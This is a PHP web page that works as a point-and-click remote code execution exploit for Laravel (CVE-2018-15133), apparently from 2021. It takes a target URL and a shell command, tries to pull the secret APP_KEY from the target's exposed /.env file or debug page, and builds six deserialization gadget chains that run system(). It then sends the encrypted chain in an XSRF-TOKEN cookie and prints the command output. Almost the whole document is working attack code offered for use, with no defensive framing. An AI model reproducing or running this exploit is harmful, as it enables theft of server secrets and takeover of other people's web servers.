<html>
<head>
<title>[+] Laravel APP KEY RCE [+]</title>
<meta name="viewport" content="width=device-width, initial-scale=1" /> 
<script src="https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@latest/pace-theme-default.min.css">
</head>
<body bgcolor="#1e1e1e" text="white">
<style>
  @import url('https://fonts.googleapis.com/css?family=Staatliches');

textarea {
max-width: 100%;
width: 100%;
height: 150px;
resize: none;
outline: none;
overflow: auto;
background: transparent;
color: #ffffff;
}

textarea::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

textarea::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

textarea::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

button {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

option {
  background: #1e1e1e;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

select {
    background: #1e1e1e;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
}

input {
  background: transparent;
  font-family: Staatliches;
  color: #ffffff;
  border-color: #ffffff;
  cursor: pointer;
  max-width: 95%;
}

font {
  font-family: Staatliches;
}

body::-webkit-scrollbar {
  width: 12px;               /* width of the entire scrollbar */
}

body::-webkit-scrollbar-track {
  background: ##1e1e1e;        /* color of the tracking area */
}

body::-webkit-scrollbar-thumb {
  background-color: ##1e1e1e;    /* color of the scroll thumb */
  border: 3px solid gray;  /* creates padding around scroll thumb */
}

.area {
  font-family: Courier;
}
</style>
<script>
function auto_grow(element) {
    element.style.height = "100%";
    element.style.height = (element.scrollHeight)+"px";
}
</script>
<body><center>
<font face=courier new size=5>Laravel APP KEY Rce<br><font size="3">Rce With Auto Get App Key (CVE-2018-15133)<hr>
<form method="post">
<font face=courier new>Target : <br></font> <input type="text" name="url" class="area" size="50" height="10" placeholder="https://exploits.my.id/" style="margin: 5px auto; padding-left: 5px;" value="<?php $meki = $_POST['url']; echo htmlspecialchars($meki);?>" required><br>
<font face=courier new>Appkey : <br></font> <input type="text" class="area" value="<?php $mekis = $_POST['appkey']; echo htmlspecialchars($mekis);?>" name="appkey" size="45" height="10" placeholder="base64:g4/rd+6x... ( optional )" style="margin: 5px auto; padding-left: 5px;"><br><br>
<font face=courier new>Command : <br></font> <input type="text" class="area" name="cmd" value="<?php $mekik = $_POST['cmd']; echo htmlspecialchars($mekik);?>" size="30" height="10" placeholder="ls -la" style="margin: 5px auto; padding-left: 5px;" required> <select name="metode">
    <option value="1">Method 1</option>
    <option value="2">Method 2</option>
    <option value="3">Method 3</option>
    <option value="4">Method 4</option>
    <option value="5">Method 5</option>
    <option value="6">Method 6</option>
</select>
<br><br>
<input type="submit" name="go" value="Eksekusi">
</form>
<?php
/**
 * @Con7ext | Laravel Unserialize
 */
error_reporting(0);
class Func_
{

    public function Serialize($key, $value)
    {
        $cipher = 'AES-256-CBC'; // or 'AES-128-CBC'
        $iv = random_bytes(openssl_cipher_iv_length($cipher)); // instead of rolling a dice ;)
        $value = \openssl_encrypt(base64_decode($value) , $cipher, base64_decode($key) , 0, $iv);

        if ($value === false)
        {
            exit("Could not encrypt the data.");
        }

        $iv = base64_encode($iv);
        $mac = hash_hmac('sha256', $iv . $value, base64_decode($key));

        $json = json_encode(compact('iv', 'value', 'mac'));

        if (json_last_error() !== JSON_ERROR_NONE)
        {
            echo "Could not json encode data." . PHP_EOL;
            exit();
        }

        //$encodedPayload = urlencode(base64_encode($json));
        $encodedPayload = base64_encode($json);
        return $encodedPayload;
    }
    public function GeneratePayload($command, $func = "system", $method = 1)
    {
        $payload = null;
        $p = "<?php $command exit; ?>";
        switch ($method)
        {
            case 1:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:15:"Faker\Generator":1:{s:13:"' . "\x00" . '*' . "\x00" . 'formatters";a:1:{s:8:"dispatch";s:' . strlen($func) . ':"' . $func . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 2:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:28:"Illuminate\Events\Dispatcher":1:{s:12:"' . "\x00" . '*' . "\x00" . 'listeners";a:1:{s:' . strlen($command) . ':"' . $command . '";a:1:{i:0;s:' . strlen($func) . ':"' . $func . '";}}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 3:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"' . "\x00" . '*' . "\x00" . 'app";s:' . strlen($command) . ':"' . $command . '";s:17:"' . "\x00" . '*' . "\x00" . 'defaultChannel";s:1:"x";s:17:"' . "\x00" . '*' . "\x00" . 'customCreators";a:1:{s:1:"x";s:' .strlen($func) . ':"' . $func . '";}}}';
            break;
            case 4:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:31:"Illuminate\Validation\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:' . strlen($func) . ':"' . $func . '";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";s:' . strlen($command) . ':"' . $command . '";}';
            break;
            case 5:
                $payload = 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:'. strlen($p) . ':"' . $p . '";}}}';
            break;
            case 6:
                $payload = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' . "\x00" . '*' . "\x00" . 'messages";a:0:{}s:9:"' . "\x00" . '*' . "\x00" . 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' . "\x00" . '*' . "\x00" . 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' . "\x00" . '*' . "\x00" . 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' . "\x00" . '*' . "\x00" . 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' . "\x00" . '*' . "\x00" . 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' . "\x00" . '*' . "\x00" . 'name";s:7:"abcdefg";}s:7:"' . "\x00" . '*' . "\x00" . 'code";s:' . strlen($p) . ':"' . $p . '";}}}}';
            break;
        }
        return base64_encode($payload);
    }
}

class Requester
{

    public function Requests($url, $postdata = null, $headers = null, $follow = true)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if (!empty($headers) && $headers != null)
        {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        if (!empty($postdata) && $postdata != null)
        {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        if ($follow)
        {
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        }
        $data = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $head = substr($data, 0, $header_size);
        $body = substr($data, $header_size);
        return json_decode(json_encode(array(
            'status_code' => $status_code,
            'headers' => $this->HeadersToArray($head) ,
            'body' => $body
        )));
    }
    public function HeadersToArray($str)
    {
        $str = explode("\r\n", $str);
        $str = array_splice($str, 0, count($str) - 1);
        $output = [];
        foreach ($str as $item)
        {
            if ($item === '' || empty($item)) continue;
            $index = stripos($item, ": ");
            $key = substr($item, 0, $index);
            $key = strtolower(str_replace('-', '_', $key));
            $value = substr($item, $index + 2);
            if (@$output[$key])
            {
                if (strtolower($key) === 'set_cookie')
                {
                    $output[$key] = $output[$key] . "; " . $value;
                }
                else
                {
                    $output[$key] = $output[$key];
                }
            }
            else
            {
                $output[$key] = $value;
            }
        }
        return $output;
    }
}

class Exploit extends Requester
{
    public $url;
    public $vuln;
    public $app_key;
    public function __construct($url)
    {
        $this->url = $url;
        $this->vuln = null;
        $this->app_key = null;
    }
    public function getAppKeyEnv()
    {
        $req = parent::Requests($this->url . "/.env", null, null, $follow = false);
        if (preg_match('/APP_KEY/', $req->body))
        {
            preg_match_all('/APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)/', $req->body, $matches, PREG_SET_ORDER, 0);
            $this->app_key = $matches[0][1];
        }
    }
    public function getAppKey()
    {
        $req = parent::Requests($this->url, 'a=a', null, false);
        if (preg_match('/<td>APP_KEY<\/td>/', $req->body))
        {
            preg_match_all('/<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>/', $req->body, $matches, PREG_SET_ORDER, 0);
            $this->app_key = $matches[0][1];
        }
        else
        {
            $this->getAppKeyEnv($this->url);
        }
    }
}
function Help() {
    echo '<hr><font size=3>Code by : <a href="https://www.facebook.com/con7ext"><font color=orange>Con7ext</font></a><br><font size=3>Unknown45 - 2021';
}
parse_str(implode("&", array_slice($argv, 1)), $_GET);
if (!$_REQUEST['url']) return Help();
$urls = $_POST['url'];
$Req = new Requester();
$wibu = new Exploit($urls);
$Func = new Func_();
$function = 'system';
$method = 1;
if ($_GET['key']) {
    $wibu->app_key = $_POST['appkey'];
} else {
    $wibu->getAppKey();
}
if ($_GET['function']) {
    $function = $_GET['function'];
}
if ($_GET['method']) {
    $method = $_POST['metode'];
}
if ($wibu->app_key != null)
{
        $cmd = $_POST['cmd'];
        $app = str_replace('base64:', '', $wibu->app_key);
        $command = $Func->GeneratePayload($cmd, $function, $method);
        $serialize = $Func->Serialize($app, $command);
        $header = array(
            'Cookie: XSRF-TOKEN=' . $serialize
        );
        $bre = $Req->Requests($urls,null, $header, false);
        $res = explode('</html>', $bre->body)[1];
        echo '<hr><textarea oninput="auto_grow(this)" readonly>';
        echo ($res) ? $res . PHP_EOL : 'Empty Response / Not Vuln Command' . PHP_EOL;
        echo '</textarea>';
        echo '<hr><font size=3>Code by : <a href="https://www.facebook.com/con7ext"><font color=orange>Con7ext</font></a><br><font size="3">Unknown45 - 2021';
        exit();
}
else
{
    echo "<hr>".htmlspecialchars($urls) . " ===> Cannot get APP_KEY!" . PHP_EOL;
    echo '<hr><font size=3>Code by : <a href="https://www.facebook.com/con7ext"><font color=orange>Con7ext</font></a><br><font size="3">Unknown45 - 2021';
    exit();
}
?>
<hr><font size=3>Code by : <a href="https://www.facebook.com/con7ext"><font color=orange>Con7ext</font></a><br><font size="3">Unknown45 - 2021